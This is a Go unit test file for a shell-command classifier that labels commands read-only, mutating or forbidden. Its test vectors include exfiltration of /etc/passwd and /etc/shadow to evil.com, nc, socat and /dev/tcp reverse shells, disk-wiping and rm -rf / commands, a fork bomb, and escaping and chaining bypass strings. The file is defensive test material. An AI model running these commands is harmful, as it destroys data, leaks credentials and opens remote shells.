package security

import (
	"strings"
	"testing"
)

// classifyRegressionCases holds expected Classify regression vectors for unit tests and fuzz corpus seeds.
var classifyRegressionCases = []struct {
	name     string
	command  string
	expected Classification
}{
	// ── ReadOnly ────────────────────────────────────────────
	{"ReadOnly - systemctl status", "systemctl status nginx", ReadOnly},
	{"ReadOnly - journalctl", "journalctl -u sshd", ReadOnly},
	{"ReadOnly - cat", "cat /etc/os-release", ReadOnly},
	{"ReadOnly - ls", "ls -la /var/log", ReadOnly},
	{"ReadOnly - ps", "ps aux", ReadOnly},
	{"ReadOnly - ping", "ping -c 4 8.8.8.8", ReadOnly},
	{"ReadOnly - echo", "echo \"hello\"", ReadOnly},
	{"ReadOnly - df", "df -h", ReadOnly},
	{"ReadOnly - grep", "grep ERROR /var/log/syslog", ReadOnly},
	{"ReadOnly - find (safe)", "find /var/log -name '*.log'", ReadOnly},
	{"ReadOnly - nmap", "nmap -sT localhost", ReadOnly},
	{"Mutating - curl GET (default)", "curl -s http://example.com/api/health", Mutating},
	{"Mutating - wget GET (default)", "wget -q -O- http://example.com/file", Mutating},
	{"ReadOnly - strace -p", "strace -p 1234", ReadOnly},
	{"ReadOnly - ltrace -p", "ltrace -p 1234", ReadOnly},
	{"ReadOnly - sysctl -a", "sysctl -a", ReadOnly},
	{"ReadOnly - docker ps", "docker ps -a", ReadOnly},
	{"ReadOnly - docker logs", "docker logs web", ReadOnly},
	{"ReadOnly - kubectl get", "kubectl get pods -A", ReadOnly},
	{"ReadOnly - safe pipeline", "ps aux | grep nginx", ReadOnly},
	{"ReadOnly - safe chained reads", "uptime; free -m", ReadOnly},
	{"ReadOnly - systemctl cat", "systemctl cat nginx", ReadOnly},
	{"ReadOnly - docker version", "docker version", ReadOnly},
	{"ReadOnly - docker info", "docker info", ReadOnly},
	{"ReadOnly - docker diff", "docker diff web", ReadOnly},
	{"ReadOnly - docker port", "docker port web", ReadOnly},
	{"ReadOnly - docker top", "docker top web", ReadOnly},
	{"ReadOnly - kubectl auth can-i", "kubectl auth can-i get pods", ReadOnly},
	{"ReadOnly - kubectl api-resources", "kubectl api-resources", ReadOnly},
	{"ReadOnly - kubectl api-versions", "kubectl api-versions", ReadOnly},
	{"ReadOnly - sed without -i", "sed 's/old/new/g' file.txt", ReadOnly},
	{"ReadOnly - awk without -i", "awk '{print $1}' file.txt", ReadOnly},
	{"ReadOnly - ps exact", "ps", ReadOnly},
	{"ReadOnly - id exact", "id", ReadOnly},
	{"ReadOnly - w exact", "w", ReadOnly},

	// ── Mutating ────────────────────────────────────────────
	{"Mutating - systemctl restart", "systemctl restart nginx", Mutating},
	{"Mutating - apt-get install", "apt-get install htop", Mutating},
	{"Mutating - mkdir", "mkdir /tmp/test", Mutating},
	{"Mutating - touch", "touch /tmp/foo", Mutating},
	{"Mutating - unknown fallback", "unknown_command", Mutating},
	{"Mutating - chmod", "chmod 777 /tmp/test", Mutating},
	{"Mutating - sed -i", "sed -i 's/old/new/g' file.txt", Mutating},
	{"Mutating - sed -i out of order", "sed -e 's/a/b/' -i file.txt", Mutating},
	{"Mutating - sed -ibak", "sed -ibak 's/a/b/' file.txt", Mutating},
	{"Mutating - sed --in-place", "sed --in-place file.txt", Mutating},
	{"ReadOnly - sed file-i", "sed -n 'p' file-i.txt", ReadOnly},
	{"Mutating - awk -i", "awk -i inplace '{print $1}' file.txt", Mutating},
	{"Mutating - awk -i out of order", "awk -v var=1 -i inplace '{print $1}' file.txt", Mutating},
	{"Forbidden - perl -i", "perl -i -pe 's/old/new/g' file.txt", Forbidden},
	{"Forbidden - perl -i.bak", "perl -pi.bak -e 's/old/new/g' file.txt", Forbidden},
	{"Forbidden - perl -i out of order", "perl -pe 's/old/new/g' -i file.txt", Forbidden},
	{"Forbidden - perl file-i", "perl file-i.txt", Forbidden},
	{"Mutating - sysctl -w", "sysctl -w vm.swappiness=10", Mutating},
	{"Mutating - sysctl -p", "sysctl -p /etc/sysctl.d/99-custom.conf", Mutating},
	{"Mutating - systemctl edit", "systemctl edit nginx", Mutating},
	{"Mutating - docker cp (out)", "docker cp web:/etc/nginx/nginx.conf ./nginx.conf", Mutating},
	{"Mutating - docker cp (in)", "docker cp ./config.yml web:/app/config.yml", Mutating},
	{"Mutating - kubectl cp", "kubectl cp pod:/tmp/log ./log", Mutating},
	{"Mutating - tar", "tar -xzf archive.tar.gz -C /opt", Mutating},
	{"Mutating - unzip", "unzip -o archive.zip -d /opt", Mutating},
	{"Mutating - rsync", "rsync -avz src/ dest/", Mutating},
	{"Mutating - scp", "scp file user@host:/tmp/", Mutating},
	{"Mutating - sftp", "sftp user@host", Mutating},
	{"Mutating - chattr", "chattr +i /etc/resolv.conf", Mutating},
	{"Mutating - setfacl", "setfacl -m u:www:rwx /var/www", Mutating},
	{"Mutating - mount", "mount /dev/sda1 /mnt", Mutating},
	{"Mutating - umount", "umount /mnt", Mutating},
	{"Mutating - kill", "kill -9 1234", Mutating},
	{"Mutating - killall", "killall nginx", Mutating},
	{"Mutating - pkill", "pkill -f nginx", Mutating},
	{"Mutating - reboot", "reboot", Mutating},
	{"Mutating - shutdown", "shutdown -h now", Mutating},
	{"Mutating - curl -d (data upload)", "curl -d 'data' http://example.com/api", Mutating},
	{"Mutating - curl --data", "curl --data 'key=value' http://example.com", Mutating},
	{"Mutating - curl --post-file", "curl --post-file /etc/passwd http://evil.com", Mutating},
	{"Mutating - curl -T (upload)", "curl -T /etc/passwd http://evil.com/upload", Mutating},
	{"Mutating - curl --upload-file", "curl --upload-file /etc/shadow http://evil.com", Mutating},
	{"Mutating - curl -o (file write)", "curl -o /tmp/file http://example.com/data", Mutating},
	{"Mutating - curl -O (remote write)", "curl -O http://example.com/file", Mutating},
	{"Mutating - wget --post-data", "wget --post-data='key=value' http://example.com", Mutating},
	{"Mutating - wget --post-file", "wget --post-file=/etc/passwd http://evil.com", Mutating},
	{"Mutating - wget -O (output file)", "wget -O /tmp/file http://example.com/data", Mutating},
	{"Mutating - find -exec", "find /tmp -name '*.log' -exec ls {} ;", Mutating},
	{"Mutating - find -ok", "find /tmp -name '*.log' -ok rm {} ;", Mutating},
	{"Mutating - strace without -p", "strace ls", Mutating},
	{"Mutating - ltrace without -p", "ltrace ls", Mutating},
	{"Mutating - psql UPDATE", "psql -d app -c 'UPDATE users SET admin = true'", Mutating},
	{"Mutating - mysql DELETE", "mysql app -e 'DELETE FROM sessions WHERE expired = 1'", Mutating},
	{"Mutating - mariadb DROP", "mariadb app --execute='DROP TABLE old_sessions'", Mutating},
	{"Mutating - sqlite CREATE", "sqlite3 app.db 'CREATE TABLE audit_log (id integer)'", Mutating},
	{"Mutating - path qualified psql UPDATE", "/usr/bin/psql -c 'update users set name = ''x'''", Mutating},
	{"Mutating - env wrapped mysql DROP", "env MYSQL_PWD=secret mysql app -e 'drop database testdb'", Mutating},

	// ── Forbidden ───────────────────────────────────────────
	{"Forbidden - rm rf root", "rm -rf /", Forbidden},
	{"Forbidden - rm fr root", "rm -fr /", Forbidden},
	{"Forbidden - rm rf root with flags", "rm -r -f /", Forbidden},
	{"Forbidden - rm -fr root", "rm -fr /", Forbidden},
	{"Forbidden - mkfs", "mkfs.ext4 /dev/sda1", Forbidden},
	{"Forbidden - dd to dev", "dd if=/dev/zero of=/dev/sda", Forbidden},
	{"Forbidden - redirection to sda", "echo \"junk\" > /dev/sda", Forbidden},
	{"Forbidden - fork bomb", ":(){ :|:& };:", Forbidden},
	{"Forbidden - iptables flush", "iptables -F", Forbidden},
	{"Forbidden - passwd", "passwd root", Forbidden},
	{"Forbidden - useradd", "useradd hacker", Forbidden},
	{"Forbidden - userdel", "userdel admin", Forbidden},
	{"Forbidden - usermod", "usermod -aG sudo hacker", Forbidden},
	{"Forbidden - groupadd", "groupadd hackers", Forbidden},
	{"Forbidden - groupdel", "groupdel admins", Forbidden},
	{"Forbidden - groupmod", "groupmod -n newname oldname", Forbidden},
	{"Forbidden - visudo", "visudo", Forbidden},
	{"Forbidden - shred", "shred /etc/passwd", Forbidden},
	{"Forbidden - wipefs", "wipefs /dev/sda1", Forbidden},
	{"Forbidden - fdisk", "fdisk /dev/sda", Forbidden},
	{"Forbidden - parted", "parted /dev/sda", Forbidden},
	{"Forbidden - debugfs", "debugfs /dev/sda1", Forbidden},
	{"Forbidden - tune2fs", "tune2fs /dev/sda1", Forbidden},
	{"Forbidden - resize2fs", "resize2fs /dev/sda1", Forbidden},
	{"Forbidden - xfs_growfs", "xfs_growfs /mnt", Forbidden},
	{"Forbidden - fsck", "fsck /dev/sda1", Forbidden},
	{"Forbidden - badblocks", "badblocks /dev/sda1", Forbidden},
	{"Forbidden - hdparm", "hdparm /dev/sda", Forbidden},
	{"Forbidden - sudo", "sudo rm -rf /", Forbidden},
	{"Forbidden - su", "su - root", Forbidden},
	{"Forbidden - doas", "doas rm -rf /", Forbidden},
	{"Forbidden - insmod", "insmod evil.ko", Forbidden},
	{"Forbidden - modprobe", "modprobe evil_module", Forbidden},
	{"Forbidden - rmmod", "rmmod good_module", Forbidden},
	{"Forbidden - nc reverse shell", "nc -e /bin/bash 10.0.0.1 4444", Forbidden},
	{"Forbidden - nc listener", "nc -l -p 4444", Forbidden},
	{"Forbidden - ncat reverse shell", "ncat -e /bin/bash 10.0.0.1 4444", Forbidden},
	{"Forbidden - socat", "socat TCP-LISTEN:4444,fork EXEC:/bin/bash", Forbidden},
	{"Forbidden - /dev/tcp", "bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'", Forbidden},
	{"Forbidden - /dev/udp", "bash -c 'cat /etc/passwd > /dev/udp/10.0.0.1/4444'", Forbidden},
	{"Forbidden - bash -i", "bash -i", Forbidden},
	{"Forbidden - python -c", "python -c 'import os; os.system(\"rm -rf /\")'", Forbidden},
	{"Forbidden - python3 -c", "python3 -c 'import os'", Forbidden},
	{"Forbidden - perl -e", "perl -e 'system(\"rm -rf /\")'", Forbidden},
	{"Forbidden - ruby -e", "ruby -e 'system(\"rm -rf /\")'", Forbidden},
	{"Forbidden - node -e", "node -e 'require(\"child_process\").exec(\"rm -rf /\")'", Forbidden},
	{"Forbidden - lua", "lua script.lua", Forbidden},
	{"Forbidden - python script", "python3 /tmp/x.py", Forbidden},
	{"Forbidden - python custom path", "python /home/user/script.py", Forbidden},
	{"Forbidden - bash script", "bash /tmp/setup.sh", Forbidden},
	{"Forbidden - sh script", "sh /var/tmp/x.sh", Forbidden},
	{"Forbidden - node script", "node /tmp/app.js", Forbidden},
	{"Forbidden - ruby script", "ruby /tmp/x.rb", Forbidden},
	{"Forbidden - php script", "php /tmp/x.php", Forbidden},
	{"Forbidden - perl script", "perl /tmp/x.pl", Forbidden},
	{"Forbidden - exec payload", "exec /tmp/payload", Forbidden},
	{"Forbidden - Rscript file", "Rscript /tmp/x.R", Forbidden},
	{"Forbidden - find -delete", "find / -delete", Forbidden},
	{"Forbidden - find -exec rm", "find / -name '*.txt' -exec rm {} ;", Forbidden},
	{"Forbidden - chmod 777 /etc", "chmod 777 /etc/passwd", Forbidden},
	{"Forbidden - chmod 777 /bin", "chmod 777 /bin/bash", Forbidden},
	{"Forbidden - tee /etc/passwd", "tee /etc/passwd", Forbidden},
	{"Forbidden - tee /etc/shadow", "tee /etc/shadow", Forbidden},
	{"Forbidden - tee /etc/sudoers", "tee /etc/sudoers", Forbidden},
	{"Forbidden - tee /etc/ssh", "tee /etc/ssh/sshd_config", Forbidden},
	{"Forbidden - redirection to nvme", "echo x > /dev/nvme0n1", Forbidden},
	{"Forbidden - redirection to mapper", "echo x > /dev/mapper/vg-root", Forbidden},
	{"Forbidden - cryptsetup luksFormat", "cryptsetup luksFormat /dev/sda1", Forbidden},
	{"Forbidden - nft flush", "nft flush ruleset", Forbidden},

	// ── Escaping attacks ────────────────────────────────────
	{"Escaping - sudo", `s\udo su`, Forbidden},
	{"Escaping - rm", `\rm -rf /`, Forbidden},
	{"Escaping - cat", `c\a\t /etc/passwd`, ReadOnly},
	{"Escaping - quotes", `c"a"\t /etc/shadow`, ReadOnly},

	// ── Bypass attempts (composite commands) ────────────────
	{"Bypass - readonly prefix with mutating suffix", "cat /etc/passwd; touch /tmp/hacked", Mutating},
	{"Bypass - readonly pipe to mutating", "echo hello | tee /tmp/hacked", Mutating},
	{"Bypass - readonly AND mutating", "ls && rm /tmp/foo", Mutating},
	{"Bypass - readonly OR mutating", "ping -c 1 8.8.8.8 || apt-get install nc", Mutating},
	{"Bypass - subshell mutation", "echo $(touch /tmp/hacked)", Mutating},
	{"Bypass - backtick mutation", "echo `touch /tmp/hacked`", Mutating},
	{"Bypass - redirection", "cat /etc/passwd > /tmp/passwd", Mutating},
	{"Bypass - append redirection", "echo foo >> /tmp/foo", Mutating},
	{"Bypass - escape characters", "\\r\\m -rf /tmp/foo", Mutating},
	{"Bypass - quoted command", "\"rm\" -rf /tmp/foo", Mutating},
	{"Bypass - env touch", "env touch /tmp/hacked", Mutating},
	{"Bypass - env sudo", "env sudo rm -rf /", Forbidden},
	{"Bypass - echo sudo", "echo sudo rm -rf /", Forbidden},

	// ── Path-qualified commands ─────────────────────────────
	{"Path - /usr/bin/rm", "/usr/bin/rm /tmp/file", Mutating},
	{"Path - /bin/rm", "/bin/rm -rf /tmp/dir", Mutating},
	{"Path - /sbin/iptables", "/sbin/iptables -L -n", ReadOnly},
	{"Path - /usr/bin/cat", "/usr/bin/cat /etc/passwd", ReadOnly},
	{"Path - /bin/ls", "/bin/ls -la /var/log", ReadOnly},
	{"Path - /usr/bin/find safe", "/usr/bin/find /var -name '*.log'", ReadOnly},
	{"Path - /usr/sbin/systemctl status", "/usr/sbin/systemctl status nginx", ReadOnly},
	{"Path - /usr/bin/sed -i", "/usr/bin/sed -i 's/old/new/g' file", Mutating},
	{"Path - /usr/bin/curl -d", "/usr/bin/curl -d 'data' http://example.com", Mutating},

	// ── Command length limit ────────────────────────────────
	{"Length - exact limit", strings.Repeat("a", maxCommandLen), Mutating}, // unknown cmd at limit
	{"Length - over limit", strings.Repeat("a", maxCommandLen+1), Forbidden},
	{"Length - over limit with valid prefix", "cat " + strings.Repeat("a", maxCommandLen), Forbidden},
}

func TestClassify(t *testing.T) {
	for _, tt := range classifyRegressionCases {
		t.Run(tt.name, func(t *testing.T) {
			result := Classify(tt.command)
			if result.Class != tt.expected {
				t.Errorf("Classify(%q) = %v, want %v", tt.command, result.Class, tt.expected)
			}
		})
	}
}

// classifyOrderRegressionCases complements classifyRegressionCases for prefix-priority regressions.
var classifyOrderRegressionCases = []struct {
	name     string
	command  string
	expected Classification
}{
	// sed -i must be Mutating, not ReadOnly (despite "sed " being ReadOnly)
	{"priority - sed -i before sed", "sed -i 's/old/new/g' file.txt", Mutating},
	// awk -i must be Mutating
	{"priority - awk -i before awk", "awk -i inplace '{print}' file", Mutating},
	// perl -i must be Forbidden (matches perl -e / -i pattern)
	{"priority - perl -i", "perl -i -pe 's/x/y/' file", Forbidden},
	// systemctl edit must be Mutating
	{"priority - systemctl edit", "systemctl edit nginx", Mutating},
	// docker cp must be Mutating
	{"priority - docker cp", "docker cp web:/etc/nginx/nginx.conf .", Mutating},
	// kubectl cp must be Mutating
	{"priority - kubectl cp", "kubectl cp pod:/tmp/log .", Mutating},
	// sysctl -w must be Mutating
	{"priority - sysctl -w before sysctl -a", "sysctl -w net.ipv4.ip_forward=1", Mutating},
	// sysctl -p must be Mutating
	{"priority - sysctl -p", "sysctl -p", Mutating},
}

func TestClassifyOrder(t *testing.T) {
	for _, tt := range classifyOrderRegressionCases {
		t.Run(tt.name, func(t *testing.T) {
			result := Classify(tt.command)
			if result.Class != tt.expected {
				t.Errorf("Classify(%q) = %v, want %v", tt.command, result.Class, tt.expected)
			}
		})
	}
}

func TestDatabaseMutationDetection(t *testing.T) {
	tests := []struct {
		name string
		args []string
		want bool
	}{
		{"psql update", []string{"psql", "-c", "UPDATE users SET admin = true"}, true},
		{"mysql delete", []string{"mysql", "-e", "DELETE FROM sessions WHERE expired = 1"}, true},
		{"mariadb drop", []string{"mariadb", "--execute=DROP TABLE old_sessions"}, true},
		{"sqlite create", []string{"sqlite3", "app.db", "CREATE TABLE audit_log (id integer)"}, true},
		{"psql select", []string{"psql", "-c", "SELECT * FROM users"}, false},
		{"grep update is not database", []string{"grep", "UPDATE", "/var/log/app.log"}, false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if got := isDatabaseMutation(tt.args); got != tt.want {
				t.Fatalf("isDatabaseMutation(%v) = %v, want %v", tt.args, got, tt.want)
			}
		})
	}
}

func TestPrefixSorting(t *testing.T) {
	// Verify that prefix lists are sorted by length descending after init().
	for i := 1; i < len(readOnlyPrefixes); i++ {
		if len(readOnlyPrefixes[i]) > len(readOnlyPrefixes[i-1]) {
			t.Errorf("readOnlyPrefixes not sorted by length descending: %q (len %d) comes before %q (len %d)",
				readOnlyPrefixes[i-1], len(readOnlyPrefixes[i-1]),
				readOnlyPrefixes[i], len(readOnlyPrefixes[i]))
		}
	}
	for i := 1; i < len(mutatingPrefixes); i++ {
		if len(mutatingPrefixes[i]) > len(mutatingPrefixes[i-1]) {
			t.Errorf("mutatingPrefixes not sorted by length descending: %q (len %d) comes before %q (len %d)",
				mutatingPrefixes[i-1], len(mutatingPrefixes[i-1]),
				mutatingPrefixes[i], len(mutatingPrefixes[i]))
		}
	}
}

func TestMutatingPrefixesNotInReadOnly(t *testing.T) {
	// Verify that no mutating prefix is a prefix of a read-only prefix
	// (or vice versa in a conflicting way). This catches cases where
	// a mutating prefix like "sed -i" would be shadowed by a read-only
	// prefix like "sed " if the sorting were wrong.
	for _, mp := range mutatingPrefixes {
		for _, rp := range readOnlyPrefixes {
			// Check if the base command (before first space) conflicts
			mpBase := mp
			if idx := strings.Index(mp, " "); idx != -1 {
				mpBase = mp[:idx]
			}
			rpBase := rp
			if idx := strings.Index(rp, " "); idx != -1 {
				rpBase = rp[:idx]
			}
			// Same base command with different prefixes is expected (sed, sed -i).
			// Just verify that with length-desc sorting, the longer one wins.
			if mpBase == rpBase && len(mp) > len(rp) {
				cmd := mp + " test"
				result := Classify(cmd)
				if result.Class != Mutating {
					t.Errorf("mutating prefix %q should take priority over read-only %q for command %q, got %v",
						mp, rp, cmd, result.Class)
				}
			}
		}
	}
}

func TestCheckResultReason(t *testing.T) {
	// Verify that forbidden and mutating results include a reason.
	forbidden := Classify("rm -rf /")
	if forbidden.Reason == "" {
		t.Error("Forbidden result should include a reason")
	}

	mutating := Classify("touch /tmp/file")
	if mutating.Reason == "" {
		t.Error("Mutating result should include a reason")
	}

	readOnly := Classify("ls -la")
	if readOnly.Reason != "" {
		t.Errorf("ReadOnly result should not have a reason, got: %q", readOnly.Reason)
	}
}

func TestCommandLengthLimit(t *testing.T) {
	// Exactly at limit should be processed normally.
	cmd := "echo " + strings.Repeat("a", maxCommandLen-5)
	result := Classify(cmd)
	if result.Class == Forbidden {
		t.Errorf("command at exact length limit should not be Forbidden, got: %v", result.Class)
	}

	// One over limit should be Forbidden.
	cmd = "echo " + strings.Repeat("a", maxCommandLen-4)
	result = Classify(cmd)
	if result.Class != Forbidden {
		t.Errorf("command over length limit should be Forbidden, got: %v", result.Class)
	}

	// Empty command should be fine.
	result = Classify("")
	if result.Class == Forbidden {
		t.Errorf("empty command should not be Forbidden, got: %v", result.Class)
	}
}
